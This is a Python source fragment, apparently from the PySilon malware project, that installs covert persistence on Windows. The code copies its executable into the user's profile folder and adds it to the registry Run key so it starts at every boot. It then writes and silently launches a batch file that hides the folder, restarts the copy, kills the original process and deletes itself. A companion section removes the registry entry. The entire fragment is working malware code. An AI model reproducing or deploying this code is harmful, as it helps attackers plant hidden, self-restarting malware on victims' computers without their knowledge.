from shutil import copy2, rmtree
import winreg
import sys
import os
# end of imports
# !registry_implosion
registry = winreg.ConnectRegistry(None, regbase)
winreg.OpenKey(registry, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
registry_key = winreg.OpenKey(regbase, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_WRITE)
winreg.DeleteValue(registry_key, software_registry_name)
# !registry
if IsAdmin(): regbase = winreg.HKEY_LOCAL_MACHINE
else: regbase = winreg.HKEY_CURRENT_USER
if sys.argv[0].lower() != 'c:\\users\\' + getuser() + '\\' + software_directory_name.lower() + '\\' + software_executable_name.lower() and not os.path.exists('C:\\Users\\' + getuser() + '\\' + software_directory_name + '\\' + software_executable_name):
    #.log PySilon is running for the first time on this PC 
    try:
        os.mkdir('C:\\Users\\' + getuser() + '\\' + software_directory_name)
        #.log Created PySilon\'s directory 
    except:
        pass
    copy2(sys.argv[0], 'C:\\Users\\' + getuser() + '\\' + software_directory_name + '\\' + software_executable_name)
    #.log Copied itself into Users/<username> directory 
    registry = winreg.ConnectRegistry(None, regbase)
    #.log Connected into registry 
    winreg.OpenKey(registry, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
    #.log Opened startup registry key 
    winreg.CreateKey(regbase, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
    #.log Created new entry in startup key 
    registry_key = winreg.OpenKey(regbase, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_WRITE)
    #.log Opened PySilon\'s entry in startup key 
    winreg.SetValueEx(registry_key, software_registry_name, 0, winreg.REG_SZ, 'C:\\Users\\' + getuser() + '\\' + software_directory_name + '\\' + software_executable_name)
    #.log Added PySilon\' path to PySilon\'s registry entry 
    winreg.CloseKey(registry_key)
    #.log Closed the registry key 
    with open(f'C:\\Users\\{getuser()}\\{software_directory_name}\\activate.bat', 'w', encoding='utf-8') as activator:
        process_name = sys.argv[0].split('\\')[-1]
        if IsAdmin(): attrib_value = "attrib +s +h ."
        else: attrib_value = "attrib +h ."
        activator.write(f'pushd "C:\\Users\\{getuser()}\\{software_directory_name}"\n{attrib_value}\nstart "" "{software_executable_name}"\ntaskkill /f /im "{process_name}"\ndel "%~f0"')
        #.log Generated the activator script 
    subprocess.Popen(f'C:\\Users\\{getuser()}\\{software_directory_name}\\activate.bat', creationflags=subprocess.CREATE_NO_WINDOW)
    #.log Executed the activator script. Killing itself 
    sys.exit(0)
